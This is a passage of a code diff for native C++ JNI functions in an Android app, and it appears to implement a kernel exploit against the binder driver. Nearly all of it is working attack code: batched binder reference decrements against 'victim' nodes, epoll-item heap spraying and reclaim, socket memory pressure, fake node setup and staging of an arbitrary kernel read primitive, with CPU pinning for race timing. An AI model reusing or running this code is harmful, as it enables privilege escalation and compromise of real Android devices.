+                            transaction_command_size) != 0) {
+            break;
+        }
+        queued += count;
+    }
+    close(fd);
+
+    std::uint64_t elapsed_us = static_cast<std::uint64_t>(
+            std::chrono::duration_cast<std::chrono::microseconds>(
+                    std::chrono::steady_clock::now() - started).count());
+    std::uint64_t reply_us = static_cast<std::uint64_t>(
+            std::chrono::duration_cast<std::chrono::microseconds>(
+                    reply_received - started).count());
+    std::uint64_t acquire_us = static_cast<std::uint64_t>(
+            std::chrono::duration_cast<std::chrono::microseconds>(
+                    acquire_completed - reply_received).count());
+    std::uint64_t queue_us = elapsed_us - reply_us - acquire_us;
+    bool pass = handles.size() == kNativeFragmentExportCount && acquired &&
+            reply_buffer_freed && queued == kFragmentCount;
+    char state[384];
+    std::snprintf(state, sizeof(state),
+            "status=%s stage=fragment-client exported=%zu unique=%zu"
+            " acquired=%d reply_buffer_freed=%d queued=%d expected=%d"
+            " chunk=%d reply_us=%" PRIu64 " acquire_us=%" PRIu64
+            " queue_us=%" PRIu64 " elapsed_us=%" PRIu64,
+            pass ? "pass" : "fail", handles.size(), unique_handles.size(),
+            acquired ? 1 : 0, reply_buffer_freed ? 1 : 0,
+            queued, kFragmentCount, transaction_chunk, reply_us,
+            acquire_us, queue_us, elapsed_us);
     return environment->NewStringUTF(state);
 }
 
@@ -7123,17 +9856,24 @@ Java_com_vandam_prism_NativeBridge_reclaimWithEpitems(
     int fd = predrain_epitems == kEpitemPreDrainCount
             ? duplicate_binder_fd() : -1;
     int submitted = 0;
-    for (const BatchToken& token : tokens) {
-        if (fd < 0) {
-            break;
+    int decrement_transactions = 0;
+    while (fd >= 0 && submitted < static_cast<int>(tokens.size())) {
+        const int batch_count = std::min(
+                kDisclosureCveBatchSize,
+                static_cast<int>(tokens.size()) - submitted);
+        CveVictim victims[kDisclosureCveBatchSize] {};
+        for (int index = 0; index < batch_count; ++index) {
+            const BatchToken& token = tokens[submitted + index];
+            victims[index] = {token.ptr, token.cookie};
         }
-        CveResult result = send_single_decrement(
-                fd, g_owner_handle, token.ptr, token.cookie);
+        CveResult result = send_decrement_batch(
+                fd, g_owner_handle, victims, batch_count);
         if (result.ioctl_result != 0 || !result.failed_reply ||
             result.dead_reply) {
             break;
         }
-        ++submitted;
+        submitted += batch_count;
+        ++decrement_transactions;
     }
     if (fd >= 0) {
         close(fd);
@@ -7236,20 +9976,425 @@ Java_com_vandam_prism_NativeBridge_reclaimWithEpitems(
             " predrain_epitems=%d expected_predrain=%d"
             " kmalloc_predrain_released=%d"
             " pressure_objects=%d pressure_fds_closed=%d pressure_errno=%d"
-            " decrements=%d expected=1152 epitems=%d expected_epitems=%d"
+            " decrements=%d expected=1152 transactions=%d batch_size=%d"
+            " epitems=%d expected_epitems=%d"
             " file_epitems=%d expected_file_epitems=%d"
             " cpu=%d pinned=%d retained=%d",
             pass ? "pass" : "fail", tokens.size(), unique_tokens.size(),
             predrain_epitems, kEpitemPreDrainCount,
             predrain_released ? 1 : 0, pressure_objects,
             pressure_fds_closed, pressure_errno,
-            submitted, epitems, kEpitemCount, file_epitems, kEpitemCount,
+            submitted, decrement_transactions, kDisclosureCveBatchSize,
+            epitems, kEpitemCount, file_epitems, kEpitemCount,
             cpu, pinned ? 1 : 0, stored ? 1 : 0);
     if (pass && !write_text_file(
             directory + "/epitem-leak.read-enable", state)) {
         return environment->NewStringUTF(
                 "status=fail stage=epitem-reclaim reason=read-enable");
     }
+    return environment->NewStringUTF(state);
+}
+
+extern "C" JNIEXPORT jstring JNICALL
+Java_com_vandam_prism_NativeBridge_prepareMixedEpitemReclaim(
+        JNIEnv* environment, jclass, jstring directory_string) {
+    std::lock_guard<std::mutex> producer_lock(
+            g_terminal_resource_producer_mutex);
+    if (g_terminal_fd_retirement_gate.load(std::memory_order_acquire) ||
+            directory_string == nullptr) {
+        return environment->NewStringUTF(
+                "status=fail stage=mixed-epitem-prepare reason=preflight");
+    }
+    const char* characters = environment->GetStringUTFChars(
+            directory_string, nullptr);
+    if (characters == nullptr) {
+        return environment->NewStringUTF(
+                "status=fail stage=mixed-epitem-prepare reason=directory");
+    }
+    std::string directory(characters);
+    environment->ReleaseStringUTFChars(directory_string, characters);
+
+    std::string ready = read_text_file(
+            directory + "/epitem-leak.unread-ready");
+    std::size_t cpu_position = ready.find("cpu=");
+    int cpu = cpu_position == std::string::npos ? -1 :
+            std::atoi(ready.c_str() + cpu_position + 4);
+    cpu_set_t set;
+    CPU_ZERO(&set);
+    if (cpu >= 0 && cpu < CPU_SETSIZE) {
+        CPU_SET(cpu, &set);
+    }
+    bool pinned = cpu >= 0 && cpu < CPU_SETSIZE &&
+            sched_setaffinity(0, sizeof(set), &set) == 0;
+
+    std::lock_guard<std::mutex> lock(g_epitem_mutex);
+    bool empty = g_epitem_fds.empty() && g_file_probe_fds.empty() &&
+            g_file_probe_epoll_fds.empty() &&
+            g_mixed_epitem_fds.empty() &&
+            g_mixed_file_probe_fds.empty() &&
+            g_mixed_file_probe_epoll_fds.empty();
+    int watched = pinned && empty
+            ? eventfd(0, EFD_CLOEXEC | EFD_NONBLOCK) : -1;
+    if (watched >= 0) {
+        g_mixed_epitem_fds.push_back(watched);
+    }
+    for (int index = 0; watched >= 0 &&
+            index < kEpitemPreDrainCount; ++index) {
+        int epoll_fd = epoll_create1(EPOLL_CLOEXEC);
+        epoll_event event {};
+        event.events = EPOLLIN;
+        event.data.u64 = UINT64_C(0x5034000000000000) |
+                static_cast<std::uint32_t>(index);
+        if (epoll_fd < 0 || epoll_ctl(
+                epoll_fd, EPOLL_CTL_ADD, watched, &event) != 0) {
+            if (epoll_fd >= 0) {
+                close(epoll_fd);
+            }
+            break;
+        }
+        g_mixed_epitem_fds.push_back(epoll_fd);
+        ++g_mixed_predrain_count;
+    }
+    bool pass = watched >= 0 &&
+            g_mixed_predrain_count == kEpitemPreDrainCount &&
+            g_mixed_pair_count == 0;
+    if (!pass) {
+        for (int descriptor : g_mixed_epitem_fds) {
+            close(descriptor);
+        }
+        for (int descriptor : g_mixed_file_probe_fds) {
+            close(descriptor);
+        }
+        for (int descriptor : g_mixed_file_probe_epoll_fds) {
+            close(descriptor);
+        }
+        g_mixed_epitem_fds.clear();
+        g_mixed_file_probe_fds.clear();
+        g_mixed_file_probe_epoll_fds.clear();
+        g_mixed_predrain_count = 0;
+        g_mixed_pair_count = 0;
+    }
+    char state[256];
+    std::snprintf(state, sizeof(state),
+            "status=%s stage=mixed-epitem-prepare cpu=%d pinned=%d"
+            " predrain=%d expected_predrain=%d pairs=%d expected_pairs=0",
+            pass ? "pass" : "fail", cpu, pinned ? 1 : 0,
+            g_mixed_predrain_count, kEpitemPreDrainCount,
+            g_mixed_pair_count);
+    return environment->NewStringUTF(state);
+}
+
+extern "C" JNIEXPORT jstring JNICALL
+Java_com_vandam_prism_NativeBridge_beginMixedEpitemReclaim(
+        JNIEnv* environment, jclass) {
+    std::lock_guard<std::mutex> producer_lock(
+            g_terminal_resource_producer_mutex);
+    std::lock_guard<std::mutex> lock(g_epitem_mutex);
+    int watched = g_mixed_epitem_fds.empty()
+            ? -1 : g_mixed_epitem_fds.front();
+    std::vector<int> pressure_sockets;
+    int pressure_errno = 0;
+    int pressure_objects = watched >= 0 &&
+            g_mixed_predrain_count == kEpitemPreDrainCount &&
+            g_mixed_pair_count == 0
+            ? allocate_scm_pressure(
+                    &pressure_sockets, &pressure_errno, watched) : 0;
+    int pressure_fds_closed = release_scm_pressure(&pressure_sockets);
+    bool pressure_released = pressure_objects >= kScmPressureMinimum &&
+            pressure_fds_closed > 0;
+    bool pass = pressure_released && g_mixed_pair_count == 0;
+    char state[320];
+    std::snprintf(state, sizeof(state),
+            "status=%s stage=mixed-epitem-begin"
+            " pressure_objects=%d pressure_fds_closed=%d pressure_errno=%d"
+            " pairs=%d expected_pairs=0",
+            pass ? "pass" : "fail", pressure_objects,
+            pressure_fds_closed, pressure_errno,
+            g_mixed_pair_count);
+    return environment->NewStringUTF(state);
+}
+
+extern "C" JNIEXPORT jstring JNICALL
+Java_com_vandam_prism_NativeBridge_openMixedBinderWindow(
+        JNIEnv* environment, jclass, jint count) {
+    std::lock_guard<std::mutex> producer_lock(
+            g_terminal_resource_producer_mutex);
+    std::lock_guard<std::mutex> lock(g_epitem_mutex);
+    std::size_t first = 1 + kEpitemPreDrainCount;
+    bool valid = count > 0 && count <= kEpitemCount &&
+            g_mixed_pair_count == kEpitemCount &&
+            g_mixed_epitem_fds.size() == static_cast<std::size_t>(
+                    kEpitemPreDrainCount + kEpitemCount + 1) &&
+            g_mixed_binder_window.empty();
+    int closed = 0;
+    for (int index = 0; valid && index < count; ++index) {
+        std::size_t position = first + static_cast<std::size_t>(index);
+        int descriptor = g_mixed_epitem_fds[position];
+        if (descriptor < 0 || close(descriptor) != 0) {
+            break;
+        }
+        g_mixed_epitem_fds[position] = -1;
+        g_mixed_binder_window.push_back(position);
+        ++closed;
+    }
+    bool pass = valid && closed == count;
+    char state[160];
+    std::snprintf(state, sizeof(state),
+            "status=%s stage=mixed-binder-window requested=%d closed=%d",
+            pass ? "pass" : "fail", count, closed);
+    return environment->NewStringUTF(state);
+}
+
+extern "C" JNIEXPORT jstring JNICALL
+Java_com_vandam_prism_NativeBridge_extendMixedEpitemReclaim(
+        JNIEnv* environment, jclass, jint target_pair_count) {
+    std::lock_guard<std::mutex> producer_lock(
+            g_terminal_resource_producer_mutex);
+    std::lock_guard<std::mutex> lock(g_epitem_mutex);
+    int watched = g_mixed_epitem_fds.empty()
+            ? -1 : g_mixed_epitem_fds.front();
+    int before = g_mixed_pair_count;
+    bool valid = watched >= 0 && target_pair_count > before &&
+            target_pair_count <= kEpitemCount;
+    for (int index = before; valid && index < target_pair_count; ++index) {
+        int shared_epoll = epoll_create1(EPOLL_CLOEXEC);
+        epoll_event shared_event {};
+        shared_event.events = EPOLLIN;
+        shared_event.data.u64 = UINT64_C(0x5334000000000000) |
+                static_cast<std::uint32_t>(index);
+        int probe_fd = eventfd(0, EFD_CLOEXEC | EFD_NONBLOCK);
+        int probe_epoll = probe_fd >= 0
+                ? epoll_create1(EPOLL_CLOEXEC) : -1;
+        epoll_event probe_event {};
+        probe_event.events = EPOLLIN;
+        probe_event.data.u64 = UINT64_C(0x4634000000000000) |
+                static_cast<std::uint32_t>(index);
+        if (shared_epoll < 0 || probe_epoll < 0 ||
+                epoll_ctl(shared_epoll, EPOLL_CTL_ADD,
+                          watched, &shared_event) != 0 ||
+                epoll_ctl(probe_epoll, EPOLL_CTL_ADD,
+                          probe_fd, &probe_event) != 0) {
+            if (shared_epoll >= 0) {
+                close(shared_epoll);
+            }
+            if (probe_epoll >= 0) {
+                close(probe_epoll);
+            }
+            if (probe_fd >= 0) {
+                close(probe_fd);
+            }
+            break;
+        }
+        g_mixed_epitem_fds.push_back(shared_epoll);
+        g_mixed_file_probe_fds.push_back(probe_fd);
+        g_mixed_file_probe_epoll_fds.push_back(probe_epoll);
+        ++g_mixed_pair_count;
+    }
+    bool pass = valid && g_mixed_pair_count == target_pair_count;
+    char state[192];
+    std::snprintf(state, sizeof(state),
+            "status=%s stage=mixed-epitem-extend before=%d target=%d pairs=%d",
+            pass ? "pass" : "fail", before, target_pair_count,
+            g_mixed_pair_count);
+    return environment->NewStringUTF(state);
+}
+
+extern "C" JNIEXPORT jstring JNICALL
+Java_com_vandam_prism_NativeBridge_extendMixedSharedEpitemReclaim(
+        JNIEnv* environment, jclass, jint target_count) {
+    std::lock_guard<std::mutex> producer_lock(
+            g_terminal_resource_producer_mutex);
+    std::lock_guard<std::mutex> lock(g_epitem_mutex);
+    int watched = g_mixed_epitem_fds.empty()
+            ? -1 : g_mixed_epitem_fds.front();
+    bool valid = watched >= 0 && target_count > 0 &&
+            target_count <= kMixedExtraEpitemCount &&
+            g_mixed_pair_count == kEpitemCount &&
+            g_mixed_extra_epitem_count == 0 &&
+            g_mixed_epitem_fds.size() == static_cast<std::size_t>(
+                    kEpitemPreDrainCount + kEpitemCount + 1);
+    for (int index = 0; valid && index < target_count; ++index) {
+        int epoll_fd = epoll_create1(EPOLL_CLOEXEC);
+        epoll_event event {};
+        event.events = EPOLLIN;
+        event.data.u64 = UINT64_C(0x5834000000000000) |
+                static_cast<std::uint32_t>(index);
+        if (epoll_fd < 0 || epoll_ctl(
+                epoll_fd, EPOLL_CTL_ADD, watched, &event) != 0) {
+            if (epoll_fd >= 0) {
+                close(epoll_fd);
+            }
+            break;
+        }
+        g_mixed_epitem_fds.push_back(epoll_fd);
+        ++g_mixed_extra_epitem_count;
+    }
+    bool pass = valid && g_mixed_extra_epitem_count == target_count;
+    char state[192];
+    std::snprintf(state, sizeof(state),
+            "status=%s stage=mixed-shared-epitem-extend"
+            " requested=%d extra=%d",
+            pass ? "pass" : "fail", target_count,
+            g_mixed_extra_epitem_count);
+    return environment->NewStringUTF(state);
+}
+
+extern "C" JNIEXPORT jstring JNICALL
+Java_com_vandam_prism_NativeBridge_completeMixedEpitemReclaim(
+        JNIEnv* environment, jclass) {
+    std::lock_guard<std::mutex> producer_lock(
+            g_terminal_resource_producer_mutex);
+    std::lock_guard<std::mutex> lock(g_epitem_mutex);
+    int watched = g_mixed_epitem_fds.empty()
+            ? -1 : g_mixed_epitem_fds.front();
+    int restored_window = 0;
+    for (std::size_t position : g_mixed_binder_window) {
+        int epoll_fd = epoll_create1(EPOLL_CLOEXEC);
+        epoll_event event {};
+        event.events = EPOLLIN;
+        event.data.u64 = UINT64_C(0x5334f00000000000) |
+                static_cast<std::uint32_t>(position);
+        if (epoll_fd < 0 || epoll_ctl(
+                epoll_fd, EPOLL_CTL_ADD, watched, &event) != 0) {
+            if (epoll_fd >= 0) {
+                close(epoll_fd);
+            }
+            break;
+        }
+        g_mixed_epitem_fds[position] = epoll_fd;
+        ++restored_window;
+    }
+    for (int index = g_mixed_predrain_count; watched >= 0 &&
+            index < kEpitemPreDrainCount; ++index) {
+        int epoll_fd = epoll_create1(EPOLL_CLOEXEC);
+        epoll_event event {};
+        event.events = EPOLLIN;
+        event.data.u64 = UINT64_C(0x5034000000000000) |
+                static_cast<std::uint32_t>(index);
+        if (epoll_fd < 0 || epoll_ctl(
+                epoll_fd, EPOLL_CTL_ADD, watched, &event) != 0) {
+            if (epoll_fd >= 0) {
+                close(epoll_fd);
+            }
+            break;
+        }
+        g_mixed_epitem_fds.push_back(epoll_fd);
+        ++g_mixed_predrain_count;
+    }
+    for (int index = g_mixed_pair_count; watched >= 0 &&
+            index < kEpitemCount; ++index) {
+        int shared_epoll = epoll_create1(EPOLL_CLOEXEC);
+        epoll_event shared_event {};
+        shared_event.events = EPOLLIN;
+        shared_event.data.u64 = UINT64_C(0x5334000000000000) |
+                static_cast<std::uint32_t>(index);
+        int probe_fd = eventfd(0, EFD_CLOEXEC | EFD_NONBLOCK);
+        int probe_epoll = probe_fd >= 0
+                ? epoll_create1(EPOLL_CLOEXEC) : -1;
+        epoll_event probe_event {};
+        probe_event.events = EPOLLIN;
+        probe_event.data.u64 = UINT64_C(0x4634000000000000) |
+                static_cast<std::uint32_t>(index);
+        if (shared_epoll < 0 || probe_epoll < 0 ||
+                epoll_ctl(shared_epoll, EPOLL_CTL_ADD,
+                          watched, &shared_event) != 0 ||
+                epoll_ctl(probe_epoll, EPOLL_CTL_ADD,
+                          probe_fd, &probe_event) != 0) {
+            if (shared_epoll >= 0) {
+                close(shared_epoll);
+            }
+            if (probe_epoll >= 0) {
+                close(probe_epoll);
+            }
+            if (probe_fd >= 0) {
+                close(probe_fd);
+            }
+            break;
+        }
+        g_mixed_epitem_fds.push_back(shared_epoll);
+        g_mixed_file_probe_fds.push_back(probe_fd);
+        g_mixed_file_probe_epoll_fds.push_back(probe_epoll);
+        ++g_mixed_pair_count;
+    }
+    bool pass = watched >= 0 &&
+            restored_window ==
+                    static_cast<int>(g_mixed_binder_window.size()) &&
+            g_mixed_predrain_count == kEpitemPreDrainCount &&
+            g_mixed_pair_count == kEpitemCount &&
+            g_mixed_epitem_fds.size() == static_cast<std::size_t>(
+                    kEpitemPreDrainCount + kEpitemCount +
+                    g_mixed_extra_epitem_count + 1) &&
+            g_mixed_file_probe_fds.size() == kEpitemCount &&
+            g_mixed_file_probe_epoll_fds.size() == kEpitemCount &&
+            g_epitem_fds.empty() && g_file_probe_fds.empty() &&
+            g_file_probe_epoll_fds.empty();
+    if (pass) {
+        g_epitem_fds = std::move(g_mixed_epitem_fds);
+        g_file_probe_fds = std::move(g_mixed_file_probe_fds);
+        g_file_probe_epoll_fds =
+                std::move(g_mixed_file_probe_epoll_fds);
+    } else {
+        for (int descriptor : g_mixed_epitem_fds) {
+            close(descriptor);
+        }
+        for (int descriptor : g_mixed_file_probe_fds) {
+            close(descriptor);
+        }
+        for (int descriptor : g_mixed_file_probe_epoll_fds) {
+            close(descriptor);
+        }
+        g_mixed_epitem_fds.clear();
+        g_mixed_file_probe_fds.clear();
+        g_mixed_file_probe_epoll_fds.clear();
+    }
+    int predrain = g_mixed_predrain_count;
+    int pairs = g_mixed_pair_count;
+    int window = static_cast<int>(g_mixed_binder_window.size());
+    int extra = g_mixed_extra_epitem_count;
+    g_mixed_binder_window.clear();
+    g_mixed_predrain_count = 0;
+    g_mixed_pair_count = 0;
+    g_mixed_extra_epitem_count = 0;
+    char state[288];
+    std::snprintf(state, sizeof(state),
+            "status=%s stage=mixed-epitem-complete"
+            " predrain=%d expected_predrain=%d pairs=%d expected_pairs=%d"
+            " extra=%d window=%d restored_window=%d retained=%d",
+            pass ? "pass" : "fail", predrain, kEpitemPreDrainCount,
+            pairs, kEpitemCount, extra, window, restored_window,
+            pass ? 1 : 0);
+    return environment->NewStringUTF(state);
+}
+
+extern "C" JNIEXPORT jstring JNICALL
+Java_com_vandam_prism_NativeBridge_discardMixedEpitemReclaim(
+        JNIEnv* environment, jclass) {
+    std::lock_guard<std::mutex> producer_lock(
+            g_terminal_resource_producer_mutex);
+    std::lock_guard<std::mutex> lock(g_epitem_mutex);
+    int descriptors = static_cast<int>(g_mixed_epitem_fds.size() +
+            g_mixed_file_probe_fds.size() +
+            g_mixed_file_probe_epoll_fds.size());
+    for (int descriptor : g_mixed_epitem_fds) {
+        close(descriptor);
+    }
+    for (int descriptor : g_mixed_file_probe_fds) {
+        close(descriptor);
+    }
+    for (int descriptor : g_mixed_file_probe_epoll_fds) {
+        close(descriptor);
+    }
+    g_mixed_epitem_fds.clear();
+    g_mixed_file_probe_fds.clear();
+    g_mixed_file_probe_epoll_fds.clear();
+    g_mixed_predrain_count = 0;
+    g_mixed_pair_count = 0;
+    g_mixed_extra_epitem_count = 0;
+    g_mixed_binder_window.clear();
+    char state[128];
+    std::snprintf(state, sizeof(state),
+            "status=pass stage=mixed-epitem-discard descriptors=%d",
+            descriptors);
     return environment->NewStringUTF(state);
 }
 
@@ -7288,17 +10433,24 @@ Java_com_vandam_prism_NativeBridge_decrementNodeBatch(
             unique.size() == kCohortSize && pinned && g_owner_handle > 0;
     int fd = valid ? duplicate_binder_fd() : -1;
     int submitted = 0;
-    for (const BatchToken& token : tokens) {
-        if (fd < 0) {
-            break;
+    int decrement_transactions = 0;
+    while (fd >= 0 && submitted < static_cast<int>(tokens.size())) {
+        const int batch_count = std::min(
+                kDisclosureCveBatchSize,
+                static_cast<int>(tokens.size()) - submitted);
+        CveVictim victims[kDisclosureCveBatchSize] {};
+        for (int index = 0; index < batch_count; ++index) {
+            const BatchToken& token = tokens[submitted + index];
+            victims[index] = {token.ptr, token.cookie};
         }
-        CveResult result = send_single_decrement(
-                fd, g_owner_handle, token.ptr, token.cookie);
+        CveResult result = send_decrement_batch(
+                fd, g_owner_handle, victims, batch_count);
         if (result.ioctl_result != 0 || !result.failed_reply ||
             result.dead_reply) {
             break;
         }
-        ++submitted;
+        submitted += batch_count;
+        ++decrement_transactions;
     }
     if (fd >= 0) {
         close(fd);
@@ -7326,12 +10478,130 @@ Java_com_vandam_prism_NativeBridge_decrementNodeBatch(
             decrement_notified && predrain_released && pressure_released;
     std::snprintf(state, sizeof(state),
             "status=%s stage=node-decrement tokens=%zu unique=%zu"
-            " submitted=%d expected=1152 cpu=%d pinned=%d"
+            " submitted=%d expected=1152 transactions=%d batch_size=%d"
+            " cpu=%d pinned=%d"
             " decrement_notified=%d predrain_released=%d"
             " pressure_objects=%d pressure_fds_closed=%d"
             " pressure_errno=%d read_enabled=0",
             pass ? "pass" : "fail", tokens.size(), unique.size(), submitted,
+            decrement_transactions, kDisclosureCveBatchSize,
             cpu, pinned ? 1 : 0, decrement_notified ? 1 : 0,
+            predrain_released ? 1 : 0, pressure_objects,
+            pressure_fds_closed, pressure_errno);
+    return environment->NewStringUTF(state);
+}
+
+extern "C" JNIEXPORT jstring JNICALL
+Java_com_vandam_prism_NativeBridge_decrementNodeBatchRange(
+        JNIEnv* environment, jclass, jstring directory_string,
+        jint start, jint count, jboolean notify_predrain) {
+    bool aligned = count > 0 && count < kCohortSize &&
+            count % kDisclosureCveBatchSize == 0;
+    bool first = start == 0 && aligned && notify_predrain;
+    bool second = start > 0 && aligned &&
+            start % kDisclosureCveBatchSize == 0 &&
+            start + count == kCohortSize && !notify_predrain;
+    if (directory_string == nullptr || (!first && !second)) {
+        return environment->NewStringUTF(
+                "status=fail stage=node-decrement-range reason=arguments");
+    }
+    const char* characters = environment->GetStringUTFChars(
+            directory_string, nullptr);
+    if (characters == nullptr) {
+        return environment->NewStringUTF(
+                "status=fail stage=node-decrement-range reason=directory");
+    }
+    std::string directory(characters);
+    environment->ReleaseStringUTFChars(directory_string, characters);
+
+    std::vector<BatchToken> tokens = read_token_inventory(
+            directory + "/epitem-node-tokens.bin");
+    std::set<BatchToken> unique(tokens.begin(), tokens.end());
+    bool sequence_valid = false;
+    {
+        std::lock_guard<std::mutex> lock(g_split_disclosure_mutex);
+        sequence_valid = first
+                ? g_split_disclosure_tokens.empty()
+                : g_split_disclosure_tokens == tokens;
+    }
+    std::string ready = read_text_file(
+            directory + "/epitem-leak.unread-ready");
+    std::size_t cpu_position = ready.find("cpu=");
+    int cpu = cpu_position == std::string::npos ? -1 :
+            std::atoi(ready.c_str() + cpu_position + 4);
+    cpu_set_t set;
+    CPU_ZERO(&set);
+    if (cpu >= 0 && cpu < CPU_SETSIZE) {
+        CPU_SET(cpu, &set);
+    }
+    bool pinned = cpu >= 0 && cpu < CPU_SETSIZE &&
+            sched_setaffinity(0, sizeof(set), &set) == 0;
+    bool valid = tokens.size() == kCohortSize &&
+            unique.size() == kCohortSize && sequence_valid && pinned &&
+            g_owner_handle > 0;
+    int fd = valid ? duplicate_binder_fd() : -1;
+    int submitted = 0;
+    int decrement_transactions = 0;
+    while (fd >= 0 && submitted < count) {
+        int batch_count = std::min(
+                kDisclosureCveBatchSize, count - submitted);
+        CveVictim victims[kDisclosureCveBatchSize] {};
+        for (int index = 0; index < batch_count; ++index) {
+            const BatchToken& token = tokens[start + submitted + index];
+            victims[index] = {token.ptr, token.cookie};
+        }
+        CveResult result = send_decrement_batch(
+                fd, g_owner_handle, victims, batch_count);
+        if (result.ioctl_result != 0 || !result.failed_reply ||
+                result.dead_reply) {
+            break;
+        }
+        submitted += batch_count;
+        ++decrement_transactions;
+    }
+    if (fd >= 0) {
+        close(fd);
+    }
+
+    bool decrement_notified = !first ||
+            (submitted == count && write_text_file(
+                    directory + "/epitem-nodes-decremented",
+                    "status=pass nodes=" + std::to_string(count) +
+                            " split=1"));
+    std::string predrain_release;
+    if (first && decrement_notified && wait_for_file(
+            directory + "/kmalloc-predrain.released", 12000)) {
+        predrain_release = read_text_file(
+                directory + "/kmalloc-predrain.released");
+    }
+    bool predrain_released = !first ||
+            predrain_release.rfind("status=pass", 0) == 0;
+    int pressure_errno = 0;
+    int pressure_objects = 0;
+    int pressure_fds_closed = 0;
+    bool pressure_released = true;
+    bool pass = valid && submitted == count && decrement_notified &&
+            predrain_released && pressure_released;
+    {
+        std::lock_guard<std::mutex> lock(g_split_disclosure_mutex);
+        if (first && pass) {
+            g_split_disclosure_tokens = tokens;
+        } else if (second) {
+            g_split_disclosure_tokens.clear();
+        }
+    }
+    char state[448];
+    std::snprintf(state, sizeof(state),
+            "status=%s stage=node-decrement-range start=%d count=%d"
+            " tokens=%zu unique=%zu submitted=%d transactions=%d"
+            " batch_size=%d cpu=%d pinned=%d sequence=%d"
+            " decrement_notified=%d predrain_released=%d"
+            " pressure_objects=%d pressure_fds_closed=%d"
+            " pressure_errno=%d pressure_deferred=1 read_enabled=0",
+            pass ? "pass" : "fail", start, count, tokens.size(),
+            unique.size(), submitted, decrement_transactions,
+            kDisclosureCveBatchSize, cpu, pinned ? 1 : 0,
+            sequence_valid ? 1 : 0, decrement_notified ? 1 : 0,
             predrain_released ? 1 : 0, pressure_objects,
             pressure_fds_closed, pressure_errno);
     return environment->NewStringUTF(state);
@@ -7691,10 +10961,12 @@ Java_com_vandam_prism_NativeBridge_analyseEpitemLeak(
 extern "C" JNIEXPORT jstring JNICALL
 Java_com_vandam_prism_NativeBridge_cacheControlledHandle(
         JNIEnv* environment, jclass, jobject binder) {
-    int fd = duplicate_binder_fd();
-    int handle = fd >= 0
-            ? locate_descriptor(fd, kControlledDescriptor, 1024) : -1;
-    bool layout = handle > 0 && binder != nullptr &&
+    int handle = binder == nullptr
+            ? -1 : discover_proxy_handle(environment, binder);
+    int fd = handle > 0 ? duplicate_binder_fd() : -1;
+    bool descriptor = fd >= 0 &&
+            query_descriptor(fd, handle) == kControlledDescriptor;
+    bool layout = descriptor &&
             calibrate_ndk_wrapper(environment, binder, handle);
     if (fd >= 0) {
         close(fd);
@@ -7704,7 +10976,8 @@ Java_com_vandam_prism_NativeBridge_cacheControlledHandle(
     }
     char state[160];
     std::snprintf(state, sizeof(state),
-            "status=%s stage=controlled-handle handle=%d layout=%d",
+            "status=%s stage=controlled-handle handle=%d layout=%d"
+            " direct=1",
             layout ? "pass" : "fail", handle, layout ? 1 : 0);
     return environment->NewStringUTF(state);
 }
@@ -7750,7 +11023,7 @@ Java_com_vandam_prism_NativeBridge_prepareFakeNodeCheck(
                   &controlled_handle, sizeof(controlled_handle));
     int release_result = fd >= 0 ? write_binder_commands(
             fd, release_commands, sizeof(release_commands)) : -1;
-    usleep(500000);
+    usleep(20000);
 
     CveResult decrement;
     if (release_result == 0) {
@@ -8028,6 +11301,8 @@ Java_com_vandam_prism_NativeBridge_startIsolatedRetirementProof(
     g_raw_isolated_historical_total = 0;
     g_raw_isolated_historical_retired = 0;
     g_raw_isolated_retirement_proved = false;
+    g_raw_context_retirement_proved = false;
+    g_raw_route_release_receipt = {};
     g_raw_controlled_free_pending_victim = -1;
     g_raw_controlled_unlinks.clear();
     return static_cast<jlong>(g_raw_isolated_generation);
@@ -8759,6 +12034,22 @@ Java_com_vandam_prism_NativeBridge_prepareRawArbitraryRead(
     }
     std::string directory(characters);
     environment->ReleaseStringUTFChars(directory_string, characters);
+    const std::array<const char*, 6> overlap_files {
+            "controlled-free.enable.0",
+            "controlled-read.enable.0",
+            "controlled-read.go.0",
+            "controlled-read.continue.0",
+            "raw-target.victim-work.0",
+            "raw-target.reading.0"};
+    for (const char* name : overlap_files) {
+        std::string path = directory + "/" + name;
+        errno = 0;
+        if (unlink(path.c_str()) != 0 && errno != ENOENT) {
+            return environment->NewStringUTF(
+                    "status=fail stage=arb-read-prepare"
+                    " reason=overlap-clean");
+        }
+    }
     {
         std::lock_guard<std::mutex> lock(g_raw_reply_signal_mutex);
         if (g_terminal_fd_retirement_gate.load(
@@ -8827,7 +12118,9 @@ Java_com_vandam_prism_NativeBridge_prepareRawArbitraryRead(
             sched_setaffinity(0, sizeof(set), &set) == 0;
     int prefilled = 0;
     bool spray_prepared = pinned && prepare_fake_control_spray(
-            payload.data(), &prefilled, true);
+            payload.data(), &prefilled, true,
+            kFakeControlInitialStagedCount,
+            nullptr, 0, 0, kFakeControlInitialSprayCount);
     int fd = spray_prepared ? duplicate_binder_fd() : -1;
     split.fd = fd;
     split.target = target_handle;
@@ -8854,7 +12147,7 @@ Java_com_vandam_prism_NativeBridge_prepareRawArbitraryRead(
     }
     bool activated = false;
     if (split.thread_created && coordinator_pinned) {
-        activated = activate_split_decrement_spray(&split);
+        activated = activate_split_decrement_spray(&split, directory);
     }
     bool post_go = split.go_issued;
     bool joined = false;
@@ -8905,11 +12198,15 @@ Java_com_vandam_prism_NativeBridge_prepareRawArbitraryRead(
                 !context_quarantined &&
                 split.exact_write && split.staged_wake &&
                 split.generation_valid && split.staged_stable &&
+                split.gates_prepared && split.target_read_ready &&
+                split.read_go && split.boundary_signal &&
+                split.victim_work_ready &&
+                split.read_continue &&
                 split.global_published && split.all_entered &&
                 split.blocked == split.expected &&
-                split.expected == kFakeControlSprayCount &&
-                split.staged_expected == kFakeControlStagedCount &&
-                split.staged_active == kFakeControlStagedCount &&
+                split.expected == kFakeControlInitialSprayCount &&
+                split.staged_expected == kFakeControlInitialStagedCount &&
+                split.staged_active == kFakeControlInitialStagedCount &&
                 split.read_result == 0 && split.exact_read &&
                 split.read_tid == split.tid &&
                 split.write_enter_cpu == 2 && split.write_return_cpu == 2 &&
@@ -8930,8 +12227,8 @@ Java_com_vandam_prism_NativeBridge_prepareRawArbitraryRead(
     bool reboot_required = context_quarantined ||
             (post_go && !candidate_pass);
     int gate_error = 0;
-    bool free_gate = false;
-    bool enabled = false;
+    bool free_gate = split.gates_prepared;
+    bool enabled = split.gates_prepared;
     bool gate_unlinked_free = false;
     bool gate_unlinked_read = false;
     char state[4096];
@@ -8956,7 +12253,10 @@ Java_com_vandam_prism_NativeBridge_prepareRawArbitraryRead(
                 " generation=0x%" PRIx64 " staged_generation=%d"
                 " generation_captured=%d generation_valid=%d expected=%d"
